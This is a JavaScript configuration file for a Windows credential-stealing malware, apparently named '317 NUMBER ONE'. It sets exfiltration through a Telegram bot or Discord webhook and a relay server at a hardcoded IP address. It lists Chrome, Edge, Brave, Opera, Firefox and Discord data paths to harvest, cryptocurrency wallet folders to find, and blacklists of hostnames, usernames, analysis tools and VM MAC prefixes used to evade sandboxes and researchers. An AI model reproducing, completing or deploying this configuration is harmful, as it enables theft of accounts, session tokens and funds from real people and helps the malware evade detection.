// 317 NUMBER ONE Configuration
const path = require('path');

// Try to load .env from multiple locations (handles packaged exe)
try {
  require('dotenv').config({ path: path.join(__dirname, '.env') });
  require('dotenv').config(); // Also try CWD
} catch (e) {
  // dotenv not available in packaged build, use hardcoded values
}

module.exports = {
  // Telegram Configuration (Primary Exfiltration)
  // Hardcoded for packaged exe compatibility — .env override if available
  TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
  TELEGRAM_CHAT_ID: '',

  // Discord Webhook (Logging Only)
  WEBHOOK_URL: '',

  // Exfiltration Mode: 'telegram' (recommended), 'discord', 'both'
  EXFIL_MODE: 'discord',

  // Enable Discord logging (sends build info and errors to webhook)
  DISCORD_LOGGING: process.env.DISCORD_LOGGING !== "false", // Default: true

  // Stream Session Relay Server (your VPS/server IP and port)
  STREAM_SERVER_HOST: process.env.STREAM_SERVER_HOST || '20.238.26.126',
  STREAM_SERVER_PORT: parseInt(process.env.STREAM_SERVER_PORT || '7317'),

  // Discord Badge Emojis - Nitro Progression
  NITRO_BADGES: {
    "0M": "<a:nitro1:1502333867380576276> ",
    "1M": "<:bronze:1462546149079519313> ",
    "3M": "<:silver:1462546147401793722> ",
    "6M": "<:gold:1462546140321939517> ",
    "1Y": "<:platinum:1462546142972874894> ",
    "2Y": "<:diamond:1462546150354845851> ",
    "3Y": "<:emerald:1462546138631639112> ",
    "5Y": "<:ruby:1462546145220755690> ",
    "6Y": "<:opal:1462546141731098695> "
  },

  // Discord Badge Emojis - Boost Progression
  BOOST_BADGES: {
    "1M": "<:boost1:1502348753582166118> ",
    "2M": "<:discordboost2:1462546229161623758> ",
    "3M": "<:discordboost3:1462546258030755981> ",
    "6M": "<:discordboost4:1462546284647809290> ",
    "9M": "<:discordboost5:1462546311587827763> ",
    "12M": "<:discordboost6:1462546341304729662> ",
    "15M": "<:discordboost7:1462546372057235778> ",
    "18M": "<:boost18:1502351885343133726> ",
    "24M": "<:boost24:1502376415054790666> "
  },

  // Browser Paths
  BROWSERS: {
    chrome: {
      name: "Chrome",
      paths: [
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data"
      ],
      emoji: "<:Google:1502724081039179857>"
    },
    edge: {
      name: "Edge",
      paths: [
        "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"
      ],
      emoji: "<:Edge:1502724095027056791>"
    },
    brave: {
      name: "Brave",
      paths: [
        "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"
      ],
      emoji: "<:Brave:1502714705196748874>"
    },
    yandex: {
      name: "Yandex",
      paths: [
        "%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data"
      ],
      emoji: "<:Yandex:1502716244481020014>"
    },
    opera: {
      name: "Opera",
      paths: [
        "%APPDATA%\\Opera Software\\Opera Stable"
      ],
      emoji: "<:Opera:1502714604415881367>"
    },
    operagx: {
      name: "Opera GX",
      paths: [
        "%APPDATA%\\Opera Software\\Opera GX Stable"
      ],
      emoji: "<:OperaGX:1502714623512547449>"
    },
    firefox: {
      name: "Firefox",
      paths: [
        "%APPDATA%\\Mozilla\\Firefox"
      ],
      emoji: "<:Firefox:1502724165143363614>"
    }
  },

  // Discord Paths
  DISCORD_PATHS: [
    "%APPDATA%\\discord",
    "%APPDATA%\\discordcanary",
    "%APPDATA%\\discordptb",
    "%APPDATA%\\discorddevelopment",
    "%APPDATA%\\Lightcord"
  ],

  // VPN Detection
  VPN_ADAPTERS: {
    "nord": "<:nordvpn:000000000000000000> `NordVPN`",
    "expressvpn": "<:ExpressVPN:1502703902011822282> `ExpressVPN`",
    "wireguard": "<:WireGuard:1502701212909437140> `WireGuard`",
    "proton": "<:protonvpn:1502696599745335477> `ProtonVPN`",
    "surfshark": "<:Surfshark:1502696617021800488> `Surfshark`",
    "cyberghost": "<:CyberGhost:1502701902876643480> `CyberGhost`",
    "cisco anyconnect": "<:CiscoAnyConnect:1502699042197471296> `Cisco AnyConnect`",
    "fortinet": "<:FortinetVPN:1502699249798746234> `Fortinet VPN`",
    "fortissl": "<:FortinetVPN:1502699249798746234> `Fortinet VPN`",
    "windscribe": "<:Windscribe:1502703261575020544> `Windscribe`",
    "kaspersky": "<:KasperSky:1502700419107782887> `Kaspersky VPN`",
    "mullvad": "<:MullvadVPN:1502699355461910690> `Mullvad VPN`",
    "tap-windows": "<:OpenVpnC:1502699911089487882> `OpenVPN / TAP`",
    "openvpn": "<:OpenVpnC:1502699911089487882> `OpenVPN / TAP`",
    "ipvanish": "<:ipvanish:1502696637666033695> `IPVanish`"
  },

  // Game Detection
  GAMES: {
    "C:\\Riot Games\\VALORANT": "<:VALORANT:1502732549842272256>",
    "C:\\Riot Games\\League of Legends": "<:lol:1502733506176881031>",
    "C:\\Program Files\\Epic Games\\Fortnite": "<:Fortnite:1502943482300469279>",
    "C:\\Program Files (x86)\\Epic Games\\Fortnite": "<:Fortnite:1502943482300469279>",
    "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Brawlhalla": "<:brawlhalla:1509674060475531306>",
    "C:\\Program Files\\Steam\\steamapps\\common\\Brawlhalla": "<:brawlhalla:1509674060475531306>",
    "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Grand Theft Auto V": "<:GTA:1502732500965920999>",
    "C:\\Program Files\\Steam\\steamapps\\common\\Grand Theft Auto V": "<:GTA:1502732500965920999>",
    "C:\\Program Files\\Epic Games\\GTAV": "<:GTA:1502732500965920999>",
    "C:\\Program Files (x86)\\Epic Games\\GTAV": "<:GTA:1502732500965920999>",
    "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive": "<:CS2:1502946913765425303>",
    "C:\\Program Files\\Steam\\steamapps\\common\\Counter-Strike Global Offensive": "<:CS2:1502946913765425303>",
    "%APPDATA%\\.minecraft": "<:Minecraft:1502732520251457767>",
    "%LOCALAPPDATA%\\Roblox": "<:Roblox:1502732536269508688>"
  },

  // Launcher Detection
  LAUNCHERS: {
    "C:\\Program Files (x86)\\Steam": "<:Steam:1502732705664860221>",
    "C:\\Program Files\\Steam": "<:Steam:1502732705664860221>",
    "C:\\Program Files\\Epic Games": "<:EpicGamess:1502734264498782248>",
    "C:\\Program Files (x86)\\Epic Games": "<:EpicGamess:1502734264498782248>",
    "C:\\Riot Games": "<:RiotGames:1502945864702759053>"
  },

  // Wallet Detection
  WALLETS: {
    "%APPDATA%\\Exodus": "<:Exodus:1508728809652879390>",
    "%APPDATA%\\Electrum": "<:Electrum:1502740916706738216>",
    "%APPDATA%\\atomic": "<:Atomic:1502740810926657646>",
    "%LOCALAPPDATA%\\Coinomi": "<:Coinomi:1502740702201647215>",
    "%APPDATA%\\Binance": "<:Binance:1502740585205858355>"
  },

  // Anti-VM/Sandbox Detection
  BLACKLIST: {
    hostnames: [
      "apponfly", "sandbox", "malware", "virus", "analysis", "cuckoo", "sandboxie",
      "vmware", "virtual", "vbox", "qemu", "kvm", "xen", "hyper-v", "parallels",
      "sample", "test", "debug", "capture", "honeypot", "safebox",
      "joesandbox", "virustotal", "hybrid-analysis", "intel471", "recordedfuture",
      "crowdstrike", "fireeye", "mandiant", "carbonblack", "cylance", "sentinelone",
      "trendmicro", "mcafee", "symantec", "kaspersky", "bitdefender", "avast", "avg",
      "norton", "eset", "sophos", "paloalto", "fortinet", "checkpoint", "fsecure"
    ],
    usernames: [
      "sandbox", "malware", "virus", "analysis", "cuckoo", "vmware", "virtual",
      "test", "debug", "sample", "malwr", "maltest", "malwaretest", "analyzer",
      "anyrun", "joesandbox", "threat", "security", "avtest", "antivirus",
      "viruslab", "malwarelab", "researcher", "pentest", "redteam",
      "sandboxie", "virustotal", "hybrid-analysis", "intel471", "recordedfuture",
      "crowdstrike", "fireeye", "mandiant", "carbonblack", "cylance", "sentinelone",
      "trendmicro", "mcafee", "symantec", "kaspersky", "bitdefender", "avast", "avg",
      "norton", "eset", "sophos", "paloalto", "fortinet", "checkpoint", "fsecure"
    ],
    processes: [
      "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "vboxcontrol.exe",
      "vmsrvc.exe", "vmusrvc.exe", "vmnat.exe", "vmnetdhcp.exe", "vmware.exe",
      "vmwaretray.exe", "vmwareuser.exe", "vmwareauthd.exe", "vmwarehostd.exe",
      "vmtools.exe", "vboxguest.exe", "vboxhost.exe", "prl_cc.exe", "prl_tools.exe",
      "processhacker.exe", "procmon.exe", "procexp.exe", "wireshark.exe",
      "tcpview.exe", "fiddler.exe", "charles.exe", "burpsuite.exe", "ollydbg.exe",
      "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe", "idag.exe", "idag64.exe",
      "windbg.exe", "immunitydebugger.exe", "ghidra.exe", "cheatengine.exe",
      "apimonitor.exe", "rohitab.exe", "regshot.exe", "processmonitor.exe",
      "tcpdump.exe", "netmon.exe", "sysanalyzer.exe", "hiew.exe", "lordpe.exe",
      "peid.exe", "die.exe", "cffexplorer.exe", "petools.exe", "studype.exe",
      "exeinfope.exe", "dnspy.exe", "de4dot.exe", "unpacker.exe",
      "sandboxie.exe", "cuckoo.exe", "anyrun.exe", "joe.exe", "procxp.exe"
    ],
    macPrefixes: [
      [0x00, 0x0C, 0x29], // VMware
      [0x00, 0x50, 0x56], // VMware
      [0x00, 0x05, 0x69], // VMware
      [0x08, 0x00, 0x27], // VirtualBox
      [0x00, 0x15, 0x5D], // Hyper-V
      [0x00, 0x1C, 0x42]  // Parallels
    ]
  },

  // Minimum System Requirements (for sandbox detection)
  MIN_REQUIREMENTS: {
    cpuCores: 2,
    ramGB: 2,
    diskGB: 60,
    uptimeMinutes: 10,
    documentsMinFiles: 3
  }
}
